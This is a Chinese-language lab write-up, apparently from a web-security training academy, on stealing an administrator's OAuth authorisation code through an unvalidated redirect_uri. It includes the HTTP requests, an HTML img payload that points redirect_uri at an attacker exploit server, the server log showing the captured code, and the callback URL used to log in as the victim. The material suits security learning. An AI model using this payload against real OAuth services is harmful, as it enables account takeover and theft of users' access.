# 实验：通过 redirect_uri 劫持 OAuth 账户

本实验使用 OAuth 服务允许用户使用其社交媒体账户登录。OAuth 提供商的错误配置使得攻击者能够窃取与其他用户账户关联的授权码。

要解决本实验，请窃取与管理员用户关联的授权码，然后使用它访问其账户并删除用户 `carlos`。

管理员用户会打开您从 exploit server 发送的任何内容，并且他们始终与 OAuth 服务保持活动会话。

您可以使用以下凭据登录自己的社交媒体账户：`wiener:peter`。

## 步骤

使用授权账户登录功能
1. 访问应用程序账户页面 `/my-account`
    - 应用程序服务器端重定向到授权登录页面 `/social-login`

2. 访问应用程序授权登录页面
    - 应用程序服务器响应客户端重定向 HTML 到授权端点

3. 访问授权端点
    - 授权服务器重定向到授权登录页面

4. 访问后，向授权服务器提交 POST 授权登录表单，此时无任何保护参数
    - 授权服务器重定向到授权确认页面

5. 访问后，向授权确认确认端点提交空请求体的 POST 确认请求
    - 授权服务器重定向到授权端点

6. 访问最后一个授权端点
    - 授权服务器重定向到应用程序回调端点

7. 访问回调端点
    - 应用程序设置会话 cookie

退出登录后，使用授权服务器快速登录
1. 访问应用程序账户页面 `/my-account`
    - 应用程序服务器端重定向到授权登录页面 `/social-login`

2. 访问应用程序授权登录页面
    - 应用程序服务器响应客户端重定向 HTML 到授权端点

3. 访问授权端点，携带之前的授权服务器 cookie
    ```http
    GET /auth?client_id=lxqtbc3a6eypy37zgwb1o&redirect_uri=https://id.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
    Host: oauth-id.oauth-server.net
    Cookie: _session=8d9qczpJusuGYNFZ2-bHM; _session.legacy=8d9qczpJusuGYNFZ2-bHM
    ```

    - 授权服务器快速重定向到应用程序回调端点
        ```http
        Location: https://id.web-security-academy.net/oauth-callback?code=E6caKnXblhghjYV_Q0a6UTglmov8DbNzkotiIjBzqZf
        ```

4. 访问回调端点
    - 应用程序设置会话 cookie

- 注意，快速授权过程中无任何 POST 请求。此处在步骤1获取


尝试窃取授权令牌
- 载荷页面设置回调 URL 到攻击者端点
    ```html
    <img src="https://oauth-id.oauth-server.net/auth?client_id=lxqtbc3a6eypy37zgwb1o&redirect_uri=https://exploit-0a350042032ab06880d95c3301bf009e.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email">
    ```

- 发送到目标用户后，查看攻击者服务器日志
    ```log
    10.0.3.176      2026-08-15 11:45:03 +0000 "GET /exploit?code=JtX5f0DtGOQ1vaWDApFe0mM-9kcZ8AqA6LU7yOVOXr- HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
    ```
    - 提取授权令牌

- 应用授权令牌到应用程序回调端点
    ```
    https://id.web-security-academy.net/oauth-callback?code=JtX5f0DtGOQ1vaWDApFe0mM-9kcZ8AqA6LU7yOVOXr-
    ```
    - 成功作为目标用户登录

    - 注意，此处需退出当前账户后再访问回调端点
